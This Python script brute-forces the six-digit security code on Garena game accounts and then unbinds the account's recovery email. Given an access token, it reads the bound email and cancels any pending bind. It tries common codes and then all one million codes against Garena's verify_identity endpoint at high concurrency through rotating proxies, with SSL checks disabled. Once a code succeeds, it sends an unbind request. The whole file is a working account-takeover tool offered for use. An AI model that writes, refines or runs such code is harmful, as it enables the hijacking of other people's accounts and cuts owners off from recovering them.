#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
/fastbk – Garena Security Code Brute‑forcer
Works with or without proxies. Proxy formats supported:
  - IP:PORT:USER:PASS
  - IP:PORT | TYPE | ping
  - http://user:pass@IP:PORT

Run: python bot.py [concurrency]
Stops immediately when the correct security code is found and unbinds the email.
"""

import asyncio
import hashlib
import json
import os
import sys
import random
import time
from urllib.parse import urlparse, parse_qs, unquote
from typing import List, Set, Dict, Any, Optional

import aiohttp
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- Proxy loading ----------
def load_proxies(file_path: str = "proxy.txt") -> List[str]:
    proxies = []
    if not os.path.exists(file_path):
        print(f"ℹ️ Proxy file '{file_path}' not found – running without proxies.")
        return proxies

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            # ---- Detect IP:PORT:USER:PASS (4 parts separated by ':') ----
            parts = line.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
                proxy_url = f"http://{user}:{password}@{ip}:{port}"
                proxies.append(proxy_url)
                continue

            # ---- Fallback: IP:PORT | TYPE | ping ----
            pipe_parts = line.split('|')
            if pipe_parts:
                proxy_part = pipe_parts[0].strip()
                if '://' in proxy_part or '@' in proxy_part:
                    proxies.append(proxy_part)
                else:
                    proxies.append(f"http://{proxy_part}")
    if proxies:
        print(f"✅ Loaded {len(proxies)} HTTP proxies.")
    else:
        print("ℹ️ No valid proxies found – running without proxies.")
    return proxies

PROXY_POOL = load_proxies()
FAILED_PROXIES = set()  # track dead proxies

def get_random_proxy() -> Optional[str]:
    if not PROXY_POOL:
        return None
    available = [p for p in PROXY_POOL if p not in FAILED_PROXIES]
    if not available:
        print("⚠️ All proxies seem dead – falling back to direct (no proxy).")
        return None
    return random.choice(available)

# ---------- Request helpers with retry and proxy fallback ----------
async def request_with_retry(method, url, retries=5, **kwargs):
    """
    Make an aiohttp request with:
      - Proxy rotation
      - SSL disabled
      - Timeouts
      - Exponential backoff
      - Automatic fallback to direct if no proxies work
    """
    timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=20)
    kwargs.setdefault('timeout', timeout)
    kwargs.setdefault('ssl', False)

    last_error = None
    for attempt in range(retries):
        proxy = get_random_proxy()
        if proxy:
            kwargs['proxy'] = proxy
        else:
            kwargs.pop('proxy', None)  # direct connection

        try:
            async with aiohttp.ClientSession() as session:
                async with session.request(method, url, **kwargs) as resp:
                    return resp
        except (aiohttp.ClientError, asyncio.TimeoutError, aiohttp.ClientConnectionError) as e:
            last_error = e
            if proxy:
                FAILED_PROXIES.add(proxy)  # blacklist faulty proxy
            wait = (2 ** attempt) + random.uniform(0, 1)  # exponential backoff
            print(f"⚠️ Request failed (attempt {attempt+1}/{retries}) with {proxy or 'direct'}: {e}")
            print(f"   Retrying in {wait:.1f}s...")
            await asyncio.sleep(wait)

    # If all retries failed, try one last time with direct connection (no proxy)
    if proxy:
        print("🔄 All proxy attempts failed – retrying directly...")
        kwargs.pop('proxy', None)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.request(method, url, **kwargs) as resp:
                    return resp
        except Exception as e:
            last_error = e

    raise last_error or Exception("All retries failed")

# ---------- Helper to validate token & get player info ----------
async def get_player_info(token: str) -> Dict[str, str]:
    url = f"https://api-otrss.garena.com/support/callback/?access_token={token}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    resp = await request_with_retry("GET", url, headers=headers, allow_redirects=True)
    final_url = str(resp.url)
    parsed = urlparse(final_url)
    params = parse_qs(parsed.query)
    return {
        "uid": params.get("account_id", ["Unknown"])[0],
        "nickname": unquote(params.get("nickname", ["Unknown"])[0]),
        "region": params.get("region", ["Unknown"])[0]
    }

# ---------- API Helpers ----------
async def get_bind_info(token: str) -> Dict[str, Any]:
    """
    Fetch bind info using the exact headers from the working Spidey tool.
    Tries direct first, then proxy-retry, then direct again as fallback.
    """
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    params = {"app_id": "100067", "access_token": token}
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }

    # First attempt: direct (no proxy) with a longer timeout
    timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=20)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, params=params, headers=headers, timeout=timeout, ssl=False) as resp:
                if resp.status == 200:
                    try:
                        return await resp.json()
                    except Exception as e:
                        text = await resp.text()
                        raise Exception(f"JSON decode error: {e}\nResponse: {text[:200]}")
                else:
                    text = await resp.text()
                    raise Exception(f"HTTP {resp.status} – {text[:200]}")
    except Exception as e:
        print(f"⚠️ Direct bind info request failed: {e}")
        print("   Falling back to proxy-retry...")

    # Fallback: use proxy with retry (with exponential backoff)
    try:
        resp = await request_with_retry("GET", url, params=params, headers=headers, retries=5)
        if resp.status != 200:
            error_text = await resp.text()
            raise Exception(f"HTTP {resp.status} – {error_text[:200]}")
        return await resp.json()
    except Exception as e:
        print(f"❌ get_bind_info error: {e}")
        raise

async def cancel_pending(token: str) -> bool:
    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"app_id": "100067", "access_token": token}
    try:
        resp = await request_with_retry("POST", url, headers=headers, data=data, retries=3)
        return resp.status == 200
    except:
        return False

async def unbind_with_identity(token: str, identity: str) -> str:
    url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"app_id": "100067", "access_token": token, "identity_token": identity}
    resp = await request_with_retry("POST", url, headers=headers, data=data, retries=3)
    return await resp.text()

# ---------- Brute‑force core (with proxy per attempt) ----------
async def brute_force_codes(
    token: str,
    email: str,
    codes: List[str],
    concurrency: int = 150,
    tested_set: Set[str] = None,
    stage_name: str = "",
    progress_callback=None
) -> tuple:
    if tested_set is not None:
        codes = [c for c in codes if c not in tested_set]

    total = len(codes)
    if total == 0:
        return None, None

    sem = asyncio.Semaphore(concurrency)
    found = None
    identity = None
    tested = 0

    async def try_one(code: str):
        nonlocal found, identity, tested
        if found:
            return
        hashed = hashlib.sha256(code.encode('utf-8')).hexdigest()
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"email": email, "app_id": "100067", "access_token": token, "secondary_password": hashed}
        async with sem:
            proxy = get_random_proxy()
            timeout = aiohttp.ClientTimeout(total=10, connect=5, sock_read=8)
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                        headers=headers, data=data, timeout=timeout, ssl=False, proxy=proxy
                    ) as resp:
                        tested += 1
                        if progress_callback:
                            await progress_callback(tested, total, stage_name)
                        if resp.status == 200:
                            j = await resp.json()
                            if j.get("identity_token"):
                                found = code
                                identity = j["identity_token"]
            except Exception:
                pass  # silently ignore individual failures

    chunk = 500
    for i in range(0, len(codes), chunk):
        if found:
            break
        tasks = [try_one(c) for c in codes[i:i+chunk]]
        await asyncio.gather(*tasks)

    return found, identity

# ---------- Code generators ----------
def generate_common_codes() -> List[str]:
    codes = set()
    for d in range(10):
        codes.add(f"{d}{d}{d}{d}{d}{d}")
    for i in range(10):
        for j in range(6):
            seq = ''.join(str((i+k) % 10) for k in range(6))
            codes.add(seq)
            seq_desc = ''.join(str((i-k) % 10) for k in range(6))
            codes.add(seq_desc)
    popular = [
        "123456", "654321", "111111", "000000", "123123", "321321",
        "112233", "223344", "334455", "445566", "556677", "667788",
        "778899", "889900", "990011", "101010", "202020", "303030",
        "404040", "505050", "606060", "707070", "808080", "909090",
        "123321", "456654", "789987", "147258", "258369", "369147",
        "159753", "753159", "951753", "357159", "012345", "987654",
        "135790", "246813", "369258", "481216", "512345", "623456",
        "734567", "845678", "956789", "067890", "178901", "289012",
        "390123", "401234", "512345"
    ]
    codes.update(popular)
    for y in range(10, 26):
        for m in range(1, 13):
            for d in range(1, 32):
                if d <= 31:
                    codes.add(f"{d:02d}{m:02d}{y:02d}")
                    codes.add(f"{m:02d}{d:02d}{y:02d}")
                    codes.add(f"{y:02d}{m:02d}{d:02d}")
    for i in range(1000):
        s = f"{i:03d}"
        codes.add(s + s)
    codes_list = list(codes)
    if len(codes_list) > 100000:
        codes_list = codes_list[:100000]
    return codes_list

def generate_full_codes_file():
    if not os.path.exists("HLO.txt"):
        print("⏳ Generating HLO.txt (1M codes) – this takes ~10 seconds...")
        with open("HLO.txt", "w") as f:
            for i in range(1000000):
                f.write(f"{i:06d}\n")

# ---------- Progress display ----------
def print_progress(tested: int, total: int, stage: str):
    percent = tested * 100 // total if total > 0 else 0
    bar_len = 30
    filled = int(bar_len * tested / total) if total > 0 else 0
    bar = '█' * filled + '░' * (bar_len - filled)
    sys.stdout.write(f'\r{stage}: {bar} {percent}% ({tested}/{total})')
    sys.stdout.flush()
    if tested == total:
        print()

# ---------- Main orchestrator ----------
async def run_fastbk(token: str, concurrency: int = 150):
    print("🔍 Validating token...")
    try:
        player = await get_player_info(token)
        print(f"👤 Player: {player['nickname']} (UID: {player['uid']}, Region: {player['region']})")
    except Exception as e:
        print(f"❌ Token validation failed: {e}")
        print("   The token is likely invalid or expired.")
        return

    print("🔍 Fetching bind info...")
    try:
        bind = await get_bind_info(token)
        email = bind.get("email")
        if not email:
            print("❌ No bound email found on this account.")
            print(f"   Full response: {json.dumps(bind, indent=2)}")
            return
        print(f"📧 Bound email: {email}")
        if bind.get("email_to_be"):
            print("🔄 Pending bind found. Cancelling...")
            if await cancel_pending(token):
                print("✅ Pending cancelled.")
            else:
                print("⚠️ Could not cancel, continuing.")
    except Exception as e:
        print(f"❌ Error fetching bind info: {e}")
        return

    tested_set = set()

    # ---- Quick check defaults ----
    print("🔍 Quick check: trying 000000 and 123456...")
    for default in ["000000", "123456"]:
        if default in tested_set:
            continue
        hashed = hashlib.sha256(default.encode()).hexdigest()
        headers = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"email": email, "app_id": "100067", "access_token": token, "secondary_password": hashed}
        proxy = get_random_proxy()
        timeout = aiohttp.ClientTimeout(total=10, connect=5, sock_read=8)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                    headers=headers, data=data, timeout=timeout, ssl=False, proxy=proxy
                ) as resp:
                    tested_set.add(default)
                    if resp.status == 200:
                        j = await resp.json()
                        if j.get("identity_token"):
                            print(f"✅ Bypass: Found code {default}!")
                            await finalize_unbind(token, j["identity_token"])
                            return
        except Exception as e:
            print(f"⚠️ Quick check for {default} failed: {e}")

    # ---- Stage 1: 100k common codes split 50k+50k ----
    common_list = generate_common_codes()
    batch1 = common_list[:50000]
    batch2 = common_list[50000:100000]

    print(f"🔍 Stage 1A: Trying first 50,000 common codes (concurrency={concurrency})...")
    found, identity = await brute_force_codes(
        token, email, batch1, concurrency=concurrency,
        tested_set=tested_set,
        stage_name="1A",
        progress_callback=print_progress
    )
    if found:
        print(f"✅ FOUND: {found}")
        await finalize_unbind(token, identity)
        return

    print(f"\n🔍 Stage 1B: Trying next 50,000 common codes (concurrency={concurrency})...")
    found, identity = await brute_force_codes(
        token, email, batch2, concurrency=concurrency,
        tested_set=tested_set,
        stage_name="1B",
        progress_callback=print_progress
    )
    if found:
        print(f"✅ FOUND: {found}")
        await finalize_unbind(token, identity)
        return

    # ---- Stage 2: Extended 100k sequential ----
    print(f"\n🔍 Stage 2: Trying 100,000 sequential (000000-099999) (concurrency={concurrency})...")
    ext = [f"{i:06d}" for i in range(100000)]
    found, identity = await brute_force_codes(
        token, email, ext, concurrency=concurrency,
        tested_set=tested_set,
        stage_name="Stage 2",
        progress_callback=print_progress
    )
    if found:
        print(f"✅ FOUND: {found}")
        await finalize_unbind(token, identity)
        return

    # ---- Stage 3: Full 1M ----
    print(f"\n🔍 Stage 3: Trying full 1,000,000 codes (concurrency={concurrency})... (may take hours)")
    generate_full_codes_file()
    with open("HLO.txt", "r") as f:
        full = [line.strip() for line in f if line.strip()]
    found, identity = await brute_force_codes(
        token, email, full, concurrency=concurrency,
        tested_set=tested_set,
        stage_name="Stage 3",
        progress_callback=print_progress
    )
    if found:
        print(f"✅ FOUND: {found}")
        await finalize_unbind(token, identity)
    else:
        print("❌ All stages exhausted. Unbind failed.")

async def finalize_unbind(token: str, identity: str):
    print("\n🔄 Sending unbind request...")
    resp = await unbind_with_identity(token, identity)
    try:
        j = json.loads(resp)
        if j.get("result") == 0:
            print("✅ UNBIND SUCCESSFUL!")
        else:
            print(f"❌ Unbind failed: {j}")
    except:
        print(f"❌ Unbind response: {resp}")

# ---------- Entry point ----------
if __name__ == "__main__":
    print("\n" + "="*50)
    print("   /fastbk – Garena Security Code Brute‑forcer")
    print("="*50 + "\n")
    token = input("🔑 Enter Access Token: ").strip()
    if not token:
        print("❌ Token cannot be empty.")
        sys.exit(1)

    concurrency = 150
    if len(sys.argv) > 1:
        try:
            concurrency = int(sys.argv[1])
            print(f"⚡ Using concurrency: {concurrency}")
        except ValueError:
            print("⚠️ Invalid concurrency, using default 150.")
    asyncio.run(run_fastbk(token, concurrency))
